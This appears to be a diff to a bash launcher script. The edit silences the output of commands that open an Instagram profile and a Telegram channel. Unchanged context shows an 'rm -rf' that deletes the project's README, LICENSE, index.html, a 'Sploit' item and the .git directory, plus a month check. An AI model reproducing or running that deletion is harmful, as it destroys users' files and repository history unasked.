@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
-xdg-open https://instagram.com/mike90s15 && sleep 10
-xdg-open https://t.me/Mike_Edwards && sleep 5
+xdg-open https://instagram.com/mike90s15 &>/dev/null && sleep 10
+xdg-open https://t.me/Mike_Edwards &>/dev/null && sleep 5
 rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git" "regras-clownters.md"
 if [[ "$(date +%B)" != "July" ]]; then
     clear
